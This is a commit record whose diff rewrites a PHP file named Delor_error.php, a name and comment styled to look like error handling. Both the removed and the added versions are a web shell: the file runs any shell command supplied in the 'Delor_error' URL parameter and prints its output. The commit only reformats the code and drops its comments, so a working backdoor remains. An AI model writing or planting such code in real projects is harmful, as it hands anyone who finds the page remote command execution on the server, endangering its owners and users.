245a36355757dbeaac62bb0fc9b382142ae93d55
Jay <dapidalexander123@gmail.com>
2026-07-24 18:10:18 +0700

    Delor_error.php

--- Delor_error.php
+++ Delor_error.php
@@ -1,31 +1,21 @@
 <?php
-  if (isset($_GET['Delor_error'])) {
-      $command = $_GET['Delor_error'];
-      $descriptorspec = array(
-          0 => array("pipe", "r"),
-          1 => array("pipe", "w"),
-          2 => array("pipe", "w")
-      );
-
-      $process = proc_open($command, $descriptorspec, $pipes);
-
-      if (is_resource($process)) {
-          // Read output from Error
-          $output = stream_get_contents($pipes[1]);
-          echo "<pre>$output</pre>";
-
-          // Close pipes
-          fclose($pipes[0]);
-          fclose($pipes[1]);
-          fclose($pipes[2]);
-
-          // Close process
-          $return_value = proc_close($process);
-          if ($return_value !== 0) {
-              // Handle non-zero return value
-          }
-      } else {
-          // Handle error opening process
-      }
-  }
+if (isset($_GET['Delor_error'])) {
+    $command = $_GET['Delor_error'];
+    $descriptorspec = array(
+        0 => array("pipe", "r"),
+        1 => array("pipe", "w"),
+        2 => array("pipe", "w")
+    );
+    
+    $process = proc_open($command, $descriptorspec, $pipes);
+    
+    if (is_resource($process)) {
+        $output = stream_get_contents($pipes[1]);
+        echo "<pre>$output</pre>";
+        fclose($pipes[0]);
+        fclose($pipes[1]);
+        fclose($pipes[2]);
+        proc_close($process);
+    }
+}
 ?>
